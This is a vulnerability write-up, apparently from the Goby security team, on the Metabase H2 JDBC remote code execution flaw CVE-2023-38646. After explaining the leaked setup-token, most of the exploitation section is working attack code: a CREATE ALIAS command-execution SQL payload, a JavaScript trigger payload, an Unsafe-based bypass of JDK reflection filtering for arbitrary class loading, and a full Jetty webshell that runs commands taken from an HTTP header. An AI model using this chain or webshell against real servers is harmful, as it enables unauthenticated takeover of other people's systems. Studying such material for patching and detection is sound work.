# Metabase Code Execution Vulnerability (CVE-2023-38646): Exploiting H2 JDBC in Depth

## Overview:

Recently, Metabase has encountered a remote code execution vulnerability (CVE-2023-38646). Our research and analysis have revealed that this vulnerability is exploited through JDBC. Metabase supports multiple databases, and in this particular vulnerability, it is primarily triggered through H2 JDBC connection information. Currently, the publicly available techniques for in-depth exploitation of the H2 database only allow for simple command execution, which does not meet the requirements of real-world attack and defense scenarios.

Previously, pyn3rd published "Make JDBC Attacks Brilliant Again I," which demonstrated the exploitation of the H2 database. By using `RUNSCRIPT` and `TRIGGER`, they were able to execute code. Through the exploitation of this vulnerability using `TRIGGER` + `DefineClass`, complete Java code execution and vulnerability echo were achieved. Additionally, this technique is compatible with Jetty11, even though only Jetty10 is officially supported. The following is the achievement we made in Goby.

![](https://s3.bmp.ovh/imgs/2023/07/28/4a0b2c90aaf1b387.gif)

## Environment Setup

The research is built using Vulfocus. Since Metabase is only available in x86 architecture in the official Docker, we have created an ARM architecture image to make our research more efficient on M1 chips.

Online environment: [https://vulfocus.cn/#/dashboard?image_id=4a5e263f-8662-46bf-a67a-13bd72cf976c](https://vulfocus.cn/#/dashboard?image_id=4a5e263f-8662-46bf-a67a-13bd72cf976c)

Offline environment: `docker run -d -P vulfocus/vcpe-1.0-a-metabase-metabase:0.46.6-openjdk-release`

## Vulnerability Analysis

The vulnerability in question primarily arises from security risks in the database connections used in Metabase. Throughout the product, the database for data source configuration can be set during Metabase installation, as well as configured in the system management settings after installation. Therefore, the vulnerability can be exploited during the installation and configuration of the data source.

During the product installation, the `/api/setup/validate` endpoint is called to validate parameters, with the most critical part being the validation of the database connection information.

[![pCz4Pud.png](https://s1.ax1x.com/2023/07/28/pCz4Pud.png)](https://imgse.com/i/pCz4Pud)

Based on the logic of function calls, `/api/setup/validate` utilizes `api.database/test-database-connection` to process the input parameters and perform database validation. However, `api.database/test-database-connection` itself is essentially the core handler for the `POST /api/database` route.

[![pCz4AEt.png](https://s1.ax1x.com/2023/07/28/pCz4AEt.png)](https://imgse.com/i/pCz4AEt)

From an overall perspective, this vulnerability can be exploited through two methods: `setup` and `database`. The difference is that the `setup` method does not require any permissions during installation, while the `database` method requires administrator privileges.

During installation, the `setup` method verifies the correctness of the `setup-token` parameter to determine whether to proceed with the database connection.

[![pCz4iDA.png](https://s1.ax1x.com/2023/07/28/pCz4iDA.png)](https://imgse.com/i/pCz4iDA)

The `setup-token` is set to have the default permission of `public` during its generation, so it can be read through `/api/session/properties`.

[![pCz4FHI.png](https://s1.ax1x.com/2023/07/28/pCz4FHI.png)](https://imgse.com/i/pCz4FHI)

[![pCz49jH.png](https://s1.ax1x.com/2023/07/28/pCz49jH.png)](https://imgse.com/i/pCz49jH)

## Deep Exploitation

In the vulnerability analysis section, it is explained that we can achieve complete exploitation of the vulnerability through `setup` + `setup-token`. During exploitation, it heavily relies on the type of the database. Currently, Metabase supports multiple databases, but in this case, we will focus on the deep exploitation of the H2 database. The most commonly used methods for exploitation are `RUNSCRIPT` and `TRIGGER`.

The H2 database has a parameter called `init` when connecting to the database, which allows executing any SQL statement. Therefore, the overall exploitation revolves around transforming a single SQL statement into a perfect chain of vulnerability exploitation.

[![pCz4uvQ.png](https://s1.ax1x.com/2023/07/28/pCz4uvQ.png)](https://imgse.com/i/pCz4uvQ)

### RUNSCRIPT

`RUNSCRIPT FROM` can be used to execute remote SQL statements using the HTTP protocol, so when exploiting the vulnerability, we can construct malicious SQL statements to exploit it.

When executing SQL statements, using `CREATE ALIAS` will compile the content value with `javac` and then execute it.

[![pCz4m8S.png](https://s1.ax1x.com/2023/07/28/pCz4m8S.png)](https://imgse.com/i/pCz4m8S)

```sql
DROP ALIAS IF EXISTS sehll;CREATE ALIAS sehll AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "hello";}';CALL sehll ('touch /tmp/123')
```
[![pCz4EUP.png](https://s1.ax1x.com/2023/07/28/pCz4EUP.png)](https://imgse.com/i/pCz4EUP)

It should be noted that the default Docker image released by the official Metabase does not have the `javac` command, so `CREATE ALIAS` cannot be used properly.

[![pCz4V4f.png](https://s1.ax1x.com/2023/07/28/pCz4V4f.png)](https://imgse.com/i/pCz4V4f)

However, this method relies on the HTTP service and is typically prohibited from establishing HTTP protocol requests to external networks, so its effectiveness in real attacks is greatly diminished.

### TRIGGER

When parsing the `init` parameter, H2 treats `CREATE TRIGGER` differently by using `loadFromSource` to determine whether it needs to be executed using the `javascript` engine. If it starts with `//javascript`, it will be compiled and executed using the `javascript` engine.

[![pCz4eC8.png](https://s1.ax1x.com/2023/07/28/pCz4eC8.png)](https://imgse.com/i/pCz4eC8)

We can achieve code execution through the `javascript` engine. However, this method has been removed from default parsing in JDK 15. Interestingly, Metabase still utilizes the `js` engine technology in its project.

[![pCz4ngg.png](https://s1.ax1x.com/2023/07/28/pCz4ngg.png)](https://imgse.com/i/pCz4ngg)

Finally, we can build a `javascript` engine to enable code execution, like this:

```javascript
java.lang.Runtime.getRuntime().exec('touch /tmp/999')
```

[![pCz4Muj.png](https://s1.ax1x.com/2023/07/28/pCz4Muj.png)](https://imgse.com/i/pCz4Muj)

### Define Class

Through TRIGGER, we can execute arbitrary code using the `javascript` engine. Therefore, it is necessary to customize Class loading and execution in order to achieve more advanced exploitation. Since the latest version of Metabase imposes restrictions on JDK runtime, requiring JDK >= 11, we must address the issues related to JDK 9 modules and JDK 11 ReflectionFilter.

To tackle similar problems, we have achieved high compatibility with javascript scripts and bypass operations for higher version JDK. The core code is as follows:

```javascript
try {
  load("nashorn:mozilla_compat.js");
} catch (e) {}
function getUnsafe(){
  var theUnsafeMethod = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
  theUnsafeMethod.setAccessible(true); 
  return theUnsafeMethod.get(null);
}
function removeClassCache(clazz){
  var unsafe = getUnsafe();
  var clazzAnonymousClass = unsafe.defineAnonymousClass(clazz,java.lang.Class.forName("java.lang.Class").getResourceAsStream("Class.class").readAllBytes(),null);
  var reflectionDataField = clazzAnonymousClass.getDeclaredField("reflectionData");
  unsafe.putObject(clazz,unsafe.objectFieldOffset(reflectionDataField),null);
}
function bypassReflectionFilter() {
  var reflectionClass;
  try {
    reflectionClass = java.lang.Class.forName("jdk.internal.reflect.Reflection");
  } catch (error) {
    reflectionClass = java.lang.Class.forName("sun.reflect.Reflection");
  }
  var unsafe = getUnsafe();
  var classBuffer = reflectionClass.getResourceAsStream("Reflection.class").readAllBytes();
  var reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, null);
  var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField("fieldFilterMap");
  var methodFilterMapField = reflectionAnonymousClass.getDeclaredField("methodFilterMap");
  if (fieldFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
  }
  if (methodFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(methodFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
  }
  removeClassCache(java.lang.Class.forName("java.lang.Class"));
}
function setAccessible(accessibleObject){
    var unsafe = getUnsafe();
    var overrideField = java.lang.Class.forName("java.lang.reflect.AccessibleObject").getDeclaredField("override");
    var offset = unsafe.objectFieldOffset(overrideField);
    unsafe.putBoolean(accessibleObject, offset, true);
}
function defineClass(){
  var clz = null;
  var version = java.lang.System.getProperty("java.version");
  var unsafe = getUnsafe();
  var classLoader = new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0));
  try{
    if (version.split(".")[0] >= 11) {
      bypassReflectionFilter();
    defineClassMethod = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", java.lang.Class.forName("[B"),java.lang.Integer.TYPE, java.lang.Integer.TYPE);
    setAccessible(defineClassMethod);
    // 绕过 setAccessible 
    clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);
    }else{
      var protectionDomain = new java.security.ProtectionDomain(new java.security.CodeSource(null, java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.security.cert.Certificate"), 0)), null, classLoader, []);
      clz = unsafe.defineClass(null, bytes, 0, bytes.length, classLoader, protectionDomain);
    }
  }catch(error){
    error.printStackTrace();
  }finally{
    return clz;
  }
}
defineClass();
```

### Loophole echo

When the vulnerability is echoed, we can utilize `DefineClass` to execute the exploit for the vulnerability. However, the latest version of Metabase uses Jetty11, so adaptation for echoing needs to be done for this version. The core code is as follows:

```java
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

/**
 * Jetty CMD 回显马
 * @author R4v3zn woo0nise@gmail.com
 * @version 1.0.1
 */
public class JE2 {

    public JE2(){
        try{
            invoke();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void invoke()throws Exception{
        ThreadGroup group = Thread.currentThread().getThreadGroup();
        java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
        f.setAccessible(true);
        Thread[] threads = (Thread[]) f.get(group);
        thread : for (Thread thread: threads) {
            try{
                Field threadLocalsField = thread.getClass().getDeclaredField("threadLocals");
                threadLocalsField.setAccessible(true);
                Object threadLocals = threadLocalsField.get(thread);
                if (threadLocals == null){
                    continue;
                }
                Field tableField = threadLocals.getClass().getDeclaredField("table");
                tableField.setAccessible(true);
                Object tableValue = tableField.get(threadLocals);
                if (tableValue == null){
                    continue;
                }
                Object[] tables =  (Object[])tableValue;
                for (Object table:tables) {
                    if (table == null){
                        continue;
                    }
                    Field valueField = table.getClass().getDeclaredField("value");
                    valueField.setAccessible(true);
                    Object value = valueField.get(table);
                    if (value == null){
                        continue;
                    }
                    System.out.println(value.getClass().getName());
                    if(value.getClass().getName().endsWith("AsyncHttpConnection")){
                        Method method = value.getClass().getMethod("getRequest", null);
                        value = method.invoke(value, null);
                        method = value.getClass().getMethod("getHeader", new Class[]{String.class});
                        String cmd = (String)method.invoke(value, new Object[]{"cmd"});
                        String result = "\n"+exec(cmd);
                        method = value.getClass().getMethod("getPrintWriter", new Class[]{String.class});
                        java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(value, new Object[]{"utf-8"});
                        printWriter.println(result);
                        printWriter.flush();
                        break thread;
                    }else if(value.getClass().getName().endsWith("HttpConnection")){
                        Method method = value.getClass().getDeclaredMethod("getHttpChannel", null);
                        Object httpChannel = method.invoke(value, null);
                        method = httpChannel.getClass().getMethod("getRequest", null);
                        value = method.invoke(httpChannel, null);
                        method = value.getClass().getMethod("getHeader", new Class[]{String.class});
                        String cmd = (String)method.invoke(value, new Object[]{"cmd"});
                        String result = "\n"+exec(cmd);
                        method = httpChannel.getClass().getMethod("getResponse", null);
                        value = method.invoke(httpChannel, null);
                        method = value.getClass().getMethod("getWriter", null);
                        java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(value, null);
                        printWriter.println(result);
                        printWriter.flush();
                        break thread;
                    }else if (value.getClass().getName().endsWith("Channel")){
                        Field underlyingOutputField = value.getClass().getDeclaredField("underlyingOutput");
                        underlyingOutputField.setAccessible(true);
                        Object underlyingOutput = underlyingOutputField.get(value);
                        Object httpConnection;
                        try{
                            Field _channelField = underlyingOutput.getClass().getDeclaredField("_channel");
                            _channelField.setAccessible(true);
                            httpConnection = _channelField.get(underlyingOutput);
                        }catch (Exception e){
                            Field connectionField = underlyingOutput.getClass().getDeclaredField("this$0");
                            connectionField.setAccessible(true);
                            httpConnection = connectionField.get(underlyingOutput);
                        }
                        Object request = httpConnection.getClass().getMethod("getRequest").invoke(httpConnection);
                        Object response = httpConnection.getClass().getMethod("getResponse").invoke(httpConnection);
                        String cmd = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, "cmd");
                        OutputStream outputStream = (OutputStream)response.getClass().getMethod("getOutputStream").invoke(response);
                        String result = "\n"+exec(cmd);
                        outputStream.write(result.getBytes());
                        outputStream.flush();
                        break thread;
                    }
                }
            }catch (Exception e){}
        }
    }

    public String exec(String cmd){
        if (cmd != null && !"".equals(cmd)) {
            String os = System.getProperty("os.name").toLowerCase();
            cmd = cmd.trim();
            Process process = null;
            String[] executeCmd = null;
            if (os.contains("win")) {
                if (cmd.contains("ping") && !cmd.contains("-n")) {
                    cmd = cmd + " -n 4";
                }
                executeCmd = new String[]{"cmd", "/c", cmd};
            } else {
                if (cmd.contains("ping") && !cmd.contains("-n")) {
                    cmd = cmd + " -t 4";
                }
                executeCmd = new String[]{"sh", "-c", cmd};
            }
            try {
                process = Runtime.getRuntime().exec(executeCmd);
                Scanner s = new Scanner(process.getInputStream()).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                s = new Scanner(process.getErrorStream()).useDelimiter("\\a");
                output += s.hasNext()?s.next():"";
                return output;
            } catch (Exception e) {
                e.printStackTrace();
                return e.toString();
            } finally {
                if (process != null) {
                    process.destroy();
                }
            }
        } else {
            return "command not null";
        }
    }
}
```

## Summary

This vulnerability is exploited by triggering the database connection information, and using H2 allows for arbitrary commands. We utilize `TRIGGER` + `DefineClass` to exploit the vulnerability. Through our research and analysis, we have found that this technique can not only be applied to database connections, but also to SQL injection in H2, completing the process of SQL injection -> code execution.

## Reference

- [https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/](https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/)


<br/>

<br/>

[Goby Official URL](https://gobies.org/)

If you have a functional type of issue, you can raise an issue on GitHub or in the discussion group below:

1. GitHub issue: https://github.com/gobysec/Goby/issues
2. Telegram Group: http://t.me/gobies (Community advantage: Stay updated with the latest information about Goby features, events, and other announcements in real-time.) 
3. Telegram Channel: https://t.me/joinchat/ENkApMqOonRhZjFl 
4. Twitter：[https://twitter.com/GobySec](https://twitter.com/GobySec)
